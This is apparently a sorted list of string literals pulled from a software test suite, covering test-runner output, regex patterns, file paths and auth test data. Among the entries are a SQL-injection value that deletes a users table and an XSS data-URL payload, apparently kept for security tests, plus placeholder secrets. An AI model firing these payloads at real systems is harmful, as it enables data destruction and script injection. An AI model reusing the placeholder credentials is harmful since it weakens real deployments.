    "Testing dependency resolution fixes",
    "Testing dependency resolution...",
    "Testing enhanced agent registry...",
    "Testing error categorization...",
    "Testing graceful degradation",
    "Testing handler initialization...",
    "Testing health endpoints...",
    "Testing help command...",
    "Testing initialization...",
    "Testing message validation...",
    "Testing missing parameters...",
    "Testing missing token...",
    "Testing modular DataSubAgent...",
    "Testing normal deployment scenario...",
    "Testing port allocation coordination",
    "Testing pre-run size validation...",
    "Testing readiness vs health check separation",
    "Testing resource cleanup",
    "Testing secret access...",
    "Testing service discovery timing fixes",
    "Testing service initialization order...",
    "Testing startup timing...",
    "Tests - Split from",
    "Tests Executed:",
    "Tests Failed:",
    "Tests Passed:",
    "Tests completed!",
    "Tests in excluded directories:",
    "Tests marked as consistently failing",
    "Tests needing implementation:",
    "Tests passed:",
    "Tests requiring real database connections",
    "Tests requiring real external services",
    "Tests that all Five Whys fixes work together in staging environment.",
    "Tests that may fail intermittently",
    "Tests that use real LLM services",
    "Tests using only mocks",
    "The current configuration shows potential for improvement in the following areas:",
    "The service coordination system should now handle:",
    "The system analysis reveals the following insights:",
    "These files exceed 450-line limit and should be split:",
    "These files should be fixed manually before attempting any refactoring.",
    "These files will be skipped to avoid overwrites.",
    "These functions exceed 25-line limit and need helper extraction:",
    "These integration tests use excessive mocking:",
    "These test pairs appear to be exact duplicates and should be consolidated:",
    "These test pairs are highly similar and might benefit from refactoring:",
    "This demo shows Fix #2: Test Size Limits Enforcement implementation",
    "This report identifies test files that violate size constraints.",
    "This validates fixes for issues in test_critical_cold_start_initialization.py",
    "This would contain:\n- All user creation tests\n- All authentication tests  \n- All permission tests\n- All user profile tests\n- Helper functions",
    "This would require careful AST manipulation",
    "Timeout",
    "Timeout during test",
    "Timeout during validation",
    "Timeout in",
    "Timestamp:",
    "Timing difference too large:",
    "To execute the renames, run: python",
    "To fix import errors:",
    "To limit to first N files: python",
    "To restore: cp -r {backup_dir}/* {root_dir}/",
    "To run all integration tests:",
    "To run frontend tests with real services:",
    "To run real e2e tests:",
    "Token",
    "Token (first 20 chars): [cyan]",
    "Token Endpoint",
    "Token Test Data Factory\nCreates JWT tokens and OAuth tokens for auth service testing.\nSupports access tokens, refresh tokens, and service tokens with proper claims.",
    "Token Validation",
    "Token exchange timeout",
    "Token failed for reason other than expiration:",
    "Token generation took",
    "Token is expired:",
    "Token validation failed:",
    "Token validation test failed:",
    "TokenFactory",
    "TokenTestUtils",
    "Too many requests",
    "ToolDispatcher(llm_manager)",
    "ToolPermissionMiddleware does not default to staging",
    "Top splitting strategy:",
    "Top violations by type:",
    "Total Categories:",
    "Total Duration:",
    "Total Fake Tests Found:",
    "Total Files Scanned:",
    "Total Iterations:",
    "Total Test Files:",
    "Total Test Violations:",
    "Total Tests Analyzed:",
    "Total Tests:",
    "Total Tracked Tests:",
    "Total Violations:",
    "Total conftest.py files:",
    "Total errors:",
    "Total failures found:",
    "Total files processed:",
    "Total files scanned:",
    "Total fixes applied:",
    "Total iterations:",
    "Total lines:",
    "Total mocks found:",
    "Total test files scanned:",
    "Total test files:",
    "Total tests processed:",
    "Total tests scanned:",
    "Total validation time:",
    "Total violations:",
    "Total workflows:",
    "Total:",
    "Tuple[",
    "Type:",
    "UNIFIED TEST CONFIGURATION\n==========================\nCentral configuration for all testing operations across Netra platform.\nThis module defines test levels, markers, environments, and execution strategies.",
    "UNION",
    "URGENT: Add tests for",
    "URL compatibility issues:",
    "URL format mismatch. Expected:",
    "URL format mismatches:",
    "URL missing asyncpg driver specification",
    "URL:",
    "USE_DOCKER_SERVICES",
    "USE_MOCKS",
    "USE_REAL_LLM",
    "USE_REAL_SERVICES",
    "USE_TEST_DATABASE",
    "Unauthorized client",
    "Unexpected error during testing:",
    "Unexpected error:",
    "Unexpected status:",
    "Unified JWT Validation Tests Package\n\nBusiness Value: Authentication security for cross-service communication",
    "Unified Test Runner for Netra Apex Platform",
    "Unit Tests",
    "Unit tests for OAuth models and validation\nTests Pydantic models used in OAuth flows",
    "Unit tests for isolated components",
    "Unjustified mocks by category:",
    "Unjustified mocks:",
    "Unknown",
    "Unknown Variable Access env",
    "Unknown category:",
    "Unknown error",
    "Unknown role:",
    "Unknown test type:",
    "Unsupported OAuth provider:",
    "Update Jest snapshots",
    "Update optimization models based on execution results",
    "Updated configurations:",
    "Updated references in:",
    "Updated test discovery configuration",
    "Updated test runner configuration",
    "Updated test to use",
    "Updating optimization models with execution data",
    "Upstream service responding slowly",
    "Usage:",
    "Usage: python standardize_l3_test_names.py [options]",
    "Use Docker services instead of local processes",
    "Use pytest fixtures to reduce test function length:\n\n@pytest.fixture\ndef authenticated_user():\n    user_data = {\"email\": \"test@example.com\", \"password\": \"password\"}\n    user = create_user(user_data)\n    token = authenticate_user(user.email, user_data[\"password\"])\n    return user, token\n\ndef test_user_can_access_profile(authenticated_user):\n    user, token = authenticated_user\n    profile = get_user_profile(user.id, token)\n    assert profile[\"email\"] == user.email",
    "Use pytest.mark.parametrize to reduce function length:\n\n@pytest.mark.parametrize(\"email,password,expected\", [\n    (\"valid@email.com\", \"strong_password\", True),\n    (\"invalid-email\", \"password\", False),\n    (\"valid@email.com\", \"weak\", False),\n])\ndef test_user_validation(email, password, expected):\n    result = validate_user_data({\"email\": email, \"password\": password})\n    assert result == expected",
    "Use real LLM instead of mocks",
    "Use real backend services (Docker or local) for frontend tests",
    "Use real components or move mocks to shared test utilities",
    "Use test isolation for concurrent execution",
    "User",
    "User Test Data Factory\nCreates test users with consistent data patterns for auth service testing.\nSupports both local and OAuth users with proper password handling.",
    "User denied access",
    "User info fetch timeout",
    "User info timeout",
    "User management components not yet implemented",
    "User not found",
    "User with email",
    "User-Agent",
    "User.",
    "User: [cyan]",
    "UserFactory",
    "UserFlowTestBase",
    "Uses deprecated unittest patterns",
    "Uses hardcoded sleep",
    "Uses postgres:// instead of postgresql+asyncpg://",
    "Using fallback execution method",
    "VERIFIED FUNCTIONALITY:",
    "VIOLATION EXAMPLES FOR FIXES:",
    "VIOLATION TYPE BREAKDOWN:",
    "VIOLATION: conftest.py files found in non-service-level directories:",
    "VIOLATIONS:",
    "Valid state should pass validation",
    "Valid:",
    "Validate splitting suggestion",
    "Validate test structure and configuration",
    "Validating:",
    "Validation Issues Found:",
    "Validation Test",
    "Validation failed with exception:",
    "Validation for",
    "Value",
    "Variable",
    "Verbose output",
    "Verification summary saved to: workflow_verification_results.md",
    "Verify GitHub workflow status",
    "Verify all dependencies are preserved",
    "Verify all functions are included in the split",
    "Verify help text displays correctly",
    "Violations (",
    "Violations found:",
    "Violations:",
    "WARNING",
    "WARNING:",
    "WARNING: Auto-fix capabilities are DANGEROUS and disabled by default!",
    "WARNING: Found",
    "WARNING: Found naming conflicts in",
    "WARNING: New file",
    "WEBSOCKET DEV MODE FUNCTIONAL TEST REPORT",
    "WEBSOCKET_URL",
    "WS_BASE_URL",
    "Wait for all services to be healthy.",
    "Waiting for Docker services to be healthy...",
    "Waiting for services to be ready...",
    "Warning: Categories not found:",
    "Warning: Could not load .env.test file:",
    "Warning: File not found:",
    "Warning: Known failing file not found:",
    "Warning: Resume category '",
    "Warning: python-dotenv not installed, using default test environment",
    "Warnings:",
    "WebSocket",
    "WebSocket Connection",
    "WebSocket URL not found",
    "WebSocket auth failed:",
    "WebSocket auth properly rejected invalid token - GOOD!",
    "WebSocket closed unexpectedly:",
    "WebSocket config endpoint test PASSED",
    "WebSocket connected successfully",
    "WebSocket connection successful",
    "WebSocket health endpoint test PASSED",
    "WebSocket implementation is working correctly in DEV MODE!",
    "WebSocket test failed:",
    "WebSocket-related tests",
    "Worker Utilization:",
    "Workflow Status Verification Script - Corrected Test Suite",
    "Workload Simulator\n\nThis module generates realistic workload patterns with seasonality and business logic.",
    "Workload optimized. Performance improved by 25%.",
    "WorkloadSimulator",
    "Would add to",
    "Would split",
    "X-Forwarded-For",
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-RateLimit-Limit",
    "X-RateLimit-Remaining",
    "X-RateLimit-Reset",
    "X-Service-Name",
    "YES",
    "YES I UNDERSTAND THE RISKS",
    "Z",
    "ZmVybmV0LXRlc3Qta2V5LXBsYWNlaG9sZGVyLTEyMw==",
    "[",
    "[!] Action Required: Fix violations to improve test quality",
    "[+] CORS validation implemented",
    "[+] Configuration and health endpoints working",
    "[+] Connection management working",
    "[+] JWT authentication enforced",
    "[+] Message processing implemented",
    "[+] Resource cleanup functioning",
    "[+] Secure WebSocket endpoints registered",
    "[/cyan]",
    "[/green]",
    "[/red]",
    "[AUTO-FIX] Applying automatic improvements...",
    "[CONTENT] Contains '",
    "[COVERAGE] Analyzing test coverage...",
    "[CRITICAL]",
    "[CRITICAL] Configuration Status:",
    "[CRITICAL] Majority of test files violate limits. Consider systematic refactoring.",
    "[Coverage] Coverage Report: reports/coverage/html/index.html",
    "[Coverage] Total Coverage:",
    "[DEBUG] Full error details:",
    "[DEBUG] Running command for",
    "[DIR]",
    "[DRY RUN] Would rename to:",
    "[ERROR]",
    "[ERROR] Auth database connection failed",
    "[ERROR] Auth database test failed:",
    "[ERROR] Backend database connection failed",
    "[ERROR] Backend database test failed:",
    "[ERROR] Configuration loading failed:",
    "[ERROR] Error:",
    "[ERROR] Failed to run",
    "[ERROR] Failed to run frontend tests:",
    "[ERROR] Failed to run tests:",
    "[ERROR] File not found:",
    "[ERROR] Frontend tests timed out after 30 seconds",
    "[ERROR] Iteration",
    "[ERROR] PostgreSQL not available:",
    "[ERROR] Scanning",
    "[FAILED]",
    "[FAILED] STAGING STARTUP TESTS FAILED",
    "[FAILURE] Some tests failed. Please check the errors above.",
    "[FAIL]",
    "[FAIL] Backend startup tests failed",
    "[FAIL] Build failed.",
    "[FAIL] CHECKS FAILED with exit code",
    "[FAIL] DataSubAgent test failed:",
    "[FAIL] E2E tests failed",
    "[FAIL] Enhanced registry test failed:",
    "[FAIL] Failed:",
    "[FAIL] Frontend startup tests failed",
    "[FAIL] InitializationManager test failed:",
    "[FAIL] Iteration",
    "[FAIL] Linting failed. Use --fix to auto-fix issues.",
    "[FAIL] TEST FAILED:",
    "[FAIL] TESTS FAILED with exit code",
    "[FAIL] Tests failed",
    "[FAIL] Tests failed. Found",
    "[FAIL] Type checking failed.",
    "[FAIL] UNEXPECTED ERROR:",
    "[FAIL] WebSocket Connection:",
    "[FIXED]",
    "[FIXED] Fixed and verified",
    "[GAPS] Identifying test gaps...",
    "[GOOD] Most test files comply. Address remaining violations.",
    "[INFO] Cloud SQL connector not installed (optional for local dev):",
    "[INFO] Environment Variables:",
    "[INFO] No ENVIRONMENT set, using test values for local testing",
    "[INFO] No frontend tests found - passing",
    "[INFO] Running frontend tests:",
    "[INFO] Running full staging test suite...",
    "[INFO] Running quick staging health checks...",
    "[INFO] Running standard staging tests...",
    "[INFO] To run frontend tests, install dependencies with: cd frontend && npm install",
    "[INTERRUPTED] Test run cancelled by user",
    "[LIVE MODE - Testing real connections]",
    "[MAJOR]",
    "[MINOR]",
    "[MISSING]",
    "[OK]",
    "[OK] All dependencies resolved",
    "[OK] All project tests comply with real test requirements!",
    "[OK] All required configuration loaded",
    "[OK] All secrets accessible",
    "[OK] All test files are compliant!",
    "[OK] All tests comply with real test requirements!",
    "[OK] Async test configuration already updated",
    "[OK] Auth database connection closed",
    "[OK] Auth database connection successful",
    "[OK] Auth database initialized",
    "[OK] Auth database status:",
    "[OK] Backend database connection closed",
    "[OK] Backend database connection successful",
    "[OK] Backend database initialized",
    "[OK] Backend database status:",
    "[OK] Backend startup tests passed (",
    "[OK] Cloud SQL connector is available",
    "[OK] Connected to database:",
    "[OK] E2E tests passed (",
    "[OK] Exit code:",
    "[OK] Frontend startup tests passed (",
    "[OK] Health endpoints configured",
    "[OK] No changes needed:",
    "[OK] No size violations found!",
    "[OK] PostgreSQL is running on localhost:",
    "[OK] PostgreSQL version:",
    "[OK] Service initialization order correct",
    "[OK] Startup completed in",
    "[OUTPUT]",
    "[OUTPUT] Output:",
    "[PASSED]",
    "[PASS]",
    "[PASS] ALL ENVIRONMENT DETECTION TESTS PASSED!",
    "[PASS] ALL TESTS PASSED in",
    "[PASS] Agent created:",
    "[PASS] Agent retrieved:",
    "[PASS] All",
    "[PASS] All OAuth config tests passed!",
    "[PASS] All auth client environment detection tests passed!",
    "[PASS] All middleware environment default tests passed!",
    "[PASS] All schema default tests passed!",
    "[PASS] Already passing",
    "[PASS] Correctly defaults to STAGING when no env vars",
    "[PASS] Correctly defaults to staging for ambiguous service name",
    "[PASS] Correctly detects production when explicitly specified",
    "[PASS] Correctly detects staging from ENVIRONMENT var",
    "[PASS] Correctly detects staging from K_SERVICE",
    "[PASS] Execution context created:",
    "[PASS] Factory compliance defaults to staging",
    "[PASS] Factory status integration defaults to staging",
    "[PASS] Fallback mode:",
    "[PASS] Fallback result:",
    "[PASS] Fallback used:",
    "[PASS] Health status:",
    "[PASS] Individual agent registration:",
    "[PASS] Initialization result:",
    "[PASS] Initialization time:",
    "[PASS] Iteration",
    "[PASS] OAuth config correctly configured for staging",
    "[PASS] Passed:",
    "[PASS] PermissionRequest schema defaults to staging",
    "[PASS] Registry created",
    "[PASS] Registry health:",
    "[PASS] Tests passed!",
    "[PASS] Tests passed! (Run",
    "[PASS] ToolPermissionMiddleware defaults to staging",
    "[PASS] WebSocket Connection: Connected",
    "[QUALITY] Assessing test quality...",
    "[REAL E2E] TESTS WITH ACTUAL LLM/SERVICES",
    "[RECOMMEND] Generating improvement recommendations...",
    "[REPORT] Detailed report saved to:",
    "[RESULT] Exit code:",
    "[REVIEW] Running Autonomous Test Review in",
    "[Report] HTML Report: reports/tests/report.html",
    "[SETUP] Environment variables set:",
    "[SETUP] Setting staging environment variables...",
    "[SIMULATE] Checking configuration...",
    "[SIMULATE] Checking dependencies...",
    "[SIMULATE] Checking health endpoints...",
    "[SIMULATE] Checking initialization order...",
    "[SIMULATE] Checking secrets...",
    "[SIMULATE] Startup time: 12s (limit:",
    "[SIMULATION MODE - Not connecting to real services]",
    "[SKIPPED]",
    "[SKIP]",
    "[SKIP] Cannot auto-fix:",
    "[STATUS]",
    "[SUCCESS] ALL CHECKS PASSED",
    "[SUCCESS] All configuration checks completed",
    "[SUCCESS] All tests passed! Async PostgreSQL configuration is working.",
    "[SUCCESS] All tests passed! Staging deployment is healthy.",
    "[SUCCESS] Applied",
    "[SUCCESS] Basic unit tests are passing!",
    "[SUCCESS] Configuration loaded successfully!",
    "[SUCCESS] Environment detection is properly configured!",
    "[SUCCESS] STAGING STARTUP TESTS PASSED",
    "[SUCCESS] Staging configuration test completed",
    "[TEST]",
    "[TEST] Running test:",
    "[TEST] Testing API Endpoints...",
    "[TEST] Testing Authentication Flow...",
    "[TEST] Testing Service Health Endpoints...",
    "[TEST] Testing WebSocket Connectivity...",
    "[TIMEOUT] Frontend tests timed out",
    "[TIMEOUT] Iteration",
    "[TIMEOUT] Skipping remaining tests in",
    "[TIMEOUT] Test execution timed out",
    "[TIMEOUT] Test timed out",
    "[ULTRA-THINK] Performing deep semantic analysis...",
    "[WARNING] Backend server is not running. Starting it...",
    "[WARNING] ClickHouse tests require running ClickHouse instance - these are integration tests",
    "[WARNING] Frontend dev server is not running. Starting it...",
    "[WARNING] Significant test limit violations. Prioritize cleanup.",
    "[WARNING] Some tests failed. Check the report for details.",
    "[WARNING] Some tests still failing - check individual test output above",
    "[WARNING] Test file not found:",
    "[WARNING] node_modules not found. Skipping frontend tests.",
    "[WARNING] npm not available. Skipping frontend tests.",
    "[WARN] Added function but test still fails",
    "[X]",
    "[X] FILES EXCEEDING 300 LINES (",
    "[X] FILES WITH FUNCTIONS > 8 LINES (",
    "[X] FILES WITH MOCK COMPONENTS (",
    "[^:]*:)",
    "[bold blue]Starting Local OAuth Testing[/bold blue]",
    "[bold cyan]1. Checking Environment Configuration[/bold cyan]",
    "[bold cyan]2. Checking Service Health[/bold cyan]",
    "[bold cyan]3. Testing OAuth Config Endpoint[/bold cyan]",
    "[bold cyan]4. Testing OAuth Login Initiation[/bold cyan]",
    "[bold cyan]5. Testing Token Generation[/bold cyan]",
    "[bold cyan]6. Testing Token Validation[/bold cyan]",
    "[bold cyan]â•â•â• OAuth Local Test Report â•â•â•[/bold cyan]",
    "[bold green]ðŸ“‹ Recommendations:[/bold green]",
    "[bold]Auth URL:[/bold]",
    "[bold]Client ID:[/bold]",
    "[bold]Provider:[/bold]",
    "[green]âœ“ Results exported to",
    "[green]âœ“[/green]",
    "[green]âœ“[/green] All tests passed! OAuth is properly configured.",
    "[green]âœ“[/green] Config endpoint returned successfully",
    "[green]âœ“[/green] Correctly redirecting to auth service",
    "[green]âœ“[/green] Login endpoint redirects correctly",
    "[green]âœ“[/green] Token generated successfully",
    "[green]âœ“[/green] Token validated successfully",
    "[red]Error during testing:",
    "[red]âœ—[/red]",
    "[red]âœ—[/red] Config endpoint failed:",
    "[red]âœ—[/red] Dev login failed:",
    "[red]âœ—[/red] Error fetching config:",
    "[red]âœ—[/red] Error testing login flow:",
    "[red]âœ—[/red] Error testing token generation:",
    "[red]âœ—[/red] Error validating token:",
    "[red]âœ—[/red] Login endpoint didn't redirect:",
    "[red]âœ—[/red] No token in response",
    "[red]âœ—[/red] Token validation failed:",
    "[yellow]âŠ˜[/yellow]",
    "[yellow]âš [/yellow] Dev login not enabled - skipping token generation test",
    "[yellow]âš [/yellow] Unexpected redirect location",
    "\\",
    "\\.return_value\\s*=",
    "\\.side_effect\\s*=",
    "\\1\\n    \\2",
    "\\1def setup_method(self):\\n\\2\"\"\"Setup method for test class.\"\"\"\\n",
    "\\[\\s*[\"\\']Part 1[\"\\']\\s*,\\s*[\"\\']Part 2[\"\\']\\s*,\\s*[\"\\']Part 3[\"\\']\\s*\\]",
    "\\b(Mock|MagicMock|AsyncMock)\\(.*?\\)",
    "\\n\\n\\n+",
    "]",
    "] PID",
    "] Processing:",
    "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
    "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$",
    "^[a-zA-Z_]+:[a-zA-Z_]+$",
    "^\\s*(?:const|let|var)\\s+(\\w+)\\s*=\\s*(?:async\\s+)?(?:function|\\()",
    "^\\s*(?:export\\s+)?(?:async\\s+)?function\\s+(\\w+)",
    "^\\s*(?:it|test|describe)\\s*\\([\\'\"`]([^\\'\"`]+)",
    "^\\s*(\\w+)\\s*:\\s*(?:async\\s+)?(?:function|\\()",
    "^\\s*(async\\s+)?def\\s+\\w+",
    "^from \\. import",
    "^from \\.\\. import",
    "^from helpers\\.",
    "_",
    "__",
    "__func__",
    "__init__",
    "__init__.py",
    "__main__",
    "__pycache__",
    "__tests__",
    "__tests__/auth",
    "__tests__/components",
    "__tests__/hooks",
    "__tests__/integration",
    "__tests__/integration/critical-integration.test.tsx",
    "__tests__/lib",
    "__tests__/services",
    "__tests__/services/webSocketService.test.ts",
    "__tests__/store",
    "__tests__/system/startup.test.tsx",
    "__tests__/utils",
    "_assertions() - Common assertions",
    "_basic(self):\n        \"\"\"Test basic functionality of",
    "_comprehensive",
    "_convert_sslmode_to_ssl",
    "_core.py",
    "_critical",
    "_current_file_path",
    "_e2e.py",
    "_edge_cases(self):\n        \"\"\"Test edge cases for",
    "_error_handling(self):\n        \"\"\"Test error handling in",
    "_expired",
    "_extended.py",
    "_feature1.py",
    "_feature2.py",
    "_fixtures.py",
    "_functions.py",
    "_future",
    "_get_base_auth_url",
    "_helper",
    "_helper_",
    "_helpers.py",
    "_integration.py",
    "_integration_",
    "_l3",
    "_l3.py",
    "_latency_avg",
    "_latency_p95",
    "_load_from_secret_manager",
    "_normalize_postgres_url",
    "_part",
    "_part_",
    "_real",
    "_scenario_1() - First test case",
    "_scenario_2() - Second test case",
    "_setup() - Test setup logic",
    "_test",
    "_test.py",
    "_test_",
    "_tests",
    "_unit.py",
    "_user_",
    "_utilities.py",
    "_utils.py",
    "_wrong_issuer",
    "`",
    "` (similarity:",
    "` â†” `",
    "```",
    "a",
    "abc123",
    "abstractmethod",
    "access",
    "access-control-allow-origin",
    "access_",
    "access_denied",
    "access_token",
    "access_token_123",
    "account_locked",
    "account_unlocked",
    "accounts.google.com",
    "accounts.google.com/o/oauth2/v2/auth",
    "across",
    "act",
    "act-event-",
    "action",
    "active",
    "actual_value",
    "add",
    "add_function",
    "admin",
    "admin'; DELETE FROM auth_users; --",
    "admin:delete_users",
    "admin:read_users",
    "admin:update_users",
    "admin@netra.ai",
    "administrative",
    "affected_services",
    "after",
    "agent",
    "agent_completed",
    "agent_orchestration",
    "agent_started",
    "agents",
    "agents/test_example_prompts_e2e_real.py",
    "agent|supervisor|executor|chain",
    "aggressive",
    "ai",
    "alg",
    "alignment_report.json",
    "all",
    "all_passed",
    "allergy_season",
    "allow_prod",
    "already exists in",
    "already used",
    "analysis",
    "analytics",
    "analytics|metrics|dashboard|reporting",
    "analyze",
    "and",
    "anonymous",
    "anthropic",
    "api",
    "api_base",
    "api_key",
    "api_routes",
    "api_url",
    "app",
    "app.",
    "app.config",
    "app.core.secret_manager",
    "app.main:app",
    "app/",
    "app/auth",
    "app/core",
    "app/db",
    "app/llm",
    "app/middleware/tool_permission_middleware.py",
    "app/pytest.ini",
    "app/routes/factory_compliance.py",
    "app/schemas/ToolPermission.py",
    "app/services/factory_status/factory_status_integration.py",
    "app/tests",
    "app/tests/**/*.py",
    "app/tests/agents",
    "app/tests/core",
    "app/tests/core/test_config_manager.py",
    "app/tests/core/test_config_manager.py::TestConfigManager::test_initialization",
    "app/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
    "app/tests/e2e",
    "app/tests/integration",
    "app/tests/models",
    "app/tests/performance",
    "app/tests/routes",
    "app/tests/routes/test_health_route.py",
    "app/tests/services",
    "app/tests/services/agents/test_sub_agent.py::test_agent_node_is_coroutine",
    "app/tests/services/agents/test_supervisor_service.py::test_supervisor_end_to_end",
    "app/tests/services/agents/test_tools.py",
    "app/tests/services/apex_optimizer_agent/test_tool_builder.py",
    "app/tests/services/database",
    "app/tests/services/test_security_service.py",
    "app/tests/test_agent_service_critical.py",
    "app/tests/test_api_endpoints_critical.py",
    "app/tests/unit",
    "app/tests/utils",
    "app/tests/websocket",
    "app/websocket",
    "application/json",
    "applied",
    "archive",
    "are critical/high severity - immediate action required",
    "args",
    "args_kwargs_stub",
    "args_kwargs_stubs",
    "assert",
    "assert \\\\1",
    "assert \\\\1 != \\\\2",
    "assert \\\\1 == \\\\2",
    "assert \\\\1 is None",
    "assert \\\\1 is not None",
    "assert not \\\\1",
    "assertion",
    "assertion_similarity",
    "async",
    "async def",
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
    "async\\s+def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
    "asyncio",
    "asyncpg",
    "at line",
    "attempt_number",
    "attr",
    "aud",
    "auth",
    "auth-service",
    "auth.staging",
    "authUrl",
    "auth_",
    "auth_code_",
    "auth_core",
    "auth_provider",
    "auth_secret_456",
    "auth_service",
    "auth_service.auth_core.core.session_manager.SessionManager.create_session",
    "auth_service.auth_core.database.connection.auth_db.get_session",
    "auth_service.auth_core.database.connection.auth_db.initialize",
    "auth_service.auth_core.database.connection.create_async_engine",
    "auth_service.auth_core.database.connection_events.logger",
    "auth_service.auth_core.redis_manager.auth_redis_manager",
    "auth_service.auth_core.routes.auth_routes.auth_service",
    "auth_service.auth_core.routes.auth_routes.logger",
    "auth_service.auth_core.routes.auth_routes.oauth_security",
    "auth_service.auth_core.security.oauth_security.datetime",
    "auth_service.main",
    "auth_service.main:app",
    "auth_service/app",
    "auth_service/tests",
    "auth_service/tests/conftest.py",
    "auth_service_health",
    "auth_service_url",
    "auth_services",
    "auth_service|AuthService",
    "auth_success",
    "auth_url",
    "auth_users table should exist after table creation",
    "authentication",
    "auth|login|jwt|session|token",
    "auto",
    "automated",
    "automatic fixes",
    "availability",
    "avatar_url",
    "average",
    "average_estimated_duration",
    "average_rps",
    "average_success_rate",
    "average_value_score",
    "avg_complexity",
    "avg_error_rate",
    "avg_latency_p50_ms",
    "avg_latency_p95_ms",
    "avg_tokens_per_request",
    "await",
    "back_to_school",
    "backend",
    "backend-service",
    "backend-staging-pr-123",
    "backend-svc",
    "backend_health",
    "backend_secret_123",
    "backend_url",
    "background_tasks",
    "bad_test",
    "bad_tests",
    "bad_tests.json",
    "balanced",
    "base_rps",
    "basic",
    "batch_fix_results_",
    "bearer",
    "bearer.invalid.token",
    "benchmark",
    "bin",
    "black_friday",
    "blocked",
    "body",
    "bold magenta",
    "branch_name",
    "build",
    "bulk",
    "businessValue",
    "business_impact",
    "business_value_coverage.json",
    "business_value_test_coverage",
    "business_value_test_coverage.xml",
    "by_priority",
    "by_type",
    "bytes",
    "cache",
    "cache_enabled",
    "cache_hit_rate",
    "cache_hits",
    "cache_stats",
    "cache_ttl_hours",
    "cached",
    "callback",
    "callback_result",
    "calls",
    "cascade_probability",
    "cascading_failure",
    "cat app/tests/examples/test_size_compliance_examples.py",
    "categories",
    "categories_scanned",
    "categories_with_history",
    "category",
    "category1",
    "category2",
    "category_based",
    "category_failure",
    "category_statistics",
    "center",
    "challenge",
    "change_method",
    "changed test files...",
    "characters required",
    "chars",
    "chat:create",
    "chat:read_own",
    "check",
    "check_and_fix_attribute",
    "check_and_fix_import",
    "checked_in",
    "checked_out",
    "ci",
    "circuit",
    "circuit_final_test_",
    "circuit_test_code_",
    "claims-user-456",
    "claims@example.com",
    "claims@netrasystems.ai",
    "class",
    "class (Test\\w+)[^:]*:",
    "class Test",
    "class TestSyntaxFix",
    "class TestSyntaxFix:",
    "class \\\\g<0>:",
    "class \\\\w+\\\\(unittest\\\\.TestCase\\\\):",
    "class\"\"\"\n    \n    def test_initialization(self):\n        \"\"\"Test",
    "class\\s+(\\w+)\\s*[\\(:]",
    "class\\s+Mock\\w*:",
    "class\\s+Mock\\w*Component",
    "class\\s+Test\\w*Component\\w*:",
    "class\\s+\\w*Component\\w*Mock\\w*:",
    "class\\s+\\w*Mock\\w*:",
    "class_based",
    "class_to_function",
    "classes",
    "claude-3-opus",
    "claude-3-sonnet",
    "clean@example.com",
    "cleanup",
    "cleanup                   â†’ Resource management validation",
    "cleanup_duration_seconds",
    "cleanup_expired_sessions",
    "cleanup_inactive_sessions",
    "cleanup_test_processes.py",
    "cleanup_timestamp",
    "clickhouse",
    "clickhouse-default-password",
    "clickhouse/test_realistic_clickhouse_operations.py",
    "clickhouse://localhost:9000/test",
    "clickhouse_connection",
    "clickhouse|ClickHouse",
    "client",
    "client.get",
    "client.post",
    "clientId",
    "client_id",
    "client_id=",
    "client_secret",
    "cls",
    "cmdline",
    "code",
    "code_challenge",
    "code_lines",
    "code_verifier",
    "collection_warnings",
    "combined_recommendations",
    "comes AFTER first import at line",
    "command",
    "commit_sha",
    "complete_",
    "complete_workflow",
    "complete_workflow         â†’ End-to-end integration validation",
    "completion",
    "completion_tokens",
    "complexity",
    "complexity_based",
    "compliance",
    "compliance_rate",
    "component",
    "component_coverage",
    "components",
    "components_covered",
    "compose",
    "comprehensive",
    "comprehensive_fix_",
    "concurrent",
    "concurrent@example.com",
    "concurrent_writes",
    "config",
    "config/pytest.ini",
    "config_check",
    "config_endpoint",
    "config_file",
    "config_fixes",
    "configuration",
    "configuration_loading",
    "conftest.py",
    "conftest.py files** for pytest configuration\n- **",
    "conftest_files",
    "connect() got an unexpected keyword argument 'sslmode'",
    "connected",
    "connecting",
    "connection",
    "connection refused",
    "conservative",
    "consistency-service",
    "consistency-test-service",
    "consistency-test-user",
    "consistency@example.com",
    "consistent latency",
    "consistently failing tests",
    "consistently_failing",
    "const\\s+Mock\\w*\\s*=",
    "const\\s+Mock\\w+\\s*=.*?return\\s*<",
    "const\\s+\\w+Form\\s*=.*?return\\s*<div",
    "const\\s+mock\\w*\\s*=",
    "content",
    "content-length",
    "content-type",
    "content_generation",
    "content_preview",
    "content_similarity",
    "context.py",
    "conversion",
    "core",
    "correct_session_67890",
    "cors",
    "cors_validation",
    "cost",
    "cost-optimization",
    "cost_data",
    "cost_optimization",
    "cost_per_1k_input",
    "cost_per_1k_output",
    "cost_per_1k_tokens",
    "cost_per_request_usd",
    "cost_per_token_usd",
    "cost_usd",
    "cost|optimization|pricing|billing",
    "count",
    "count_based",
    "coverage",
    "coverage-final.json",
    "coverage.json",
    "coverage_gaps",
    "coverage_info",
    "coverage_percentage",
    "coverage_source",
    "coverage_target",
    "cpu_bottleneck",
    "cpu_intensive",
    "cpu_percent",
    "create",
    "createMockComponent",
    "create_module",
    "created_at",
    "creation_method",
    "critical",
    "critical modules with security/data operations",
    "critical modules...",
    "critical violations found",
    "critical violations requiring immediate fix",
    "critical-error",
    "critical/high severity fake tests",
    "critical_failure",
    "critical_files",
    "critical_paths",
    "critical_test_count",
    "critical_test_percentage",
    "criticality",
    "cross-category duplicates/highly similar tests. Consider creating shared test utilities or fixtures.",
    "cross_category_overlaps",
    "csrf",
    "csrf_test_code_",
    "csv",
    "current",
    "current_password",
    "custom",
    "customer_service",
    "customer_value_features",
    "customers",
    "cy:run",
    "cyan",
    "cypress",
    "cypress/e2e",
    "cypress/e2e/**/*.cy.ts",
    "cypress:open",
    "dashboard.md",
    "data",
    "data-service",
    "data1",
    "data2",
    "data:text/html,<script>alert('XSS')</script>",
    "data_validators",
    "database",
    "database_connection",
    "database_deadlock",
    "database_dependent",
    "database_url",
    "database|db|postgres|clickhouse|orm",
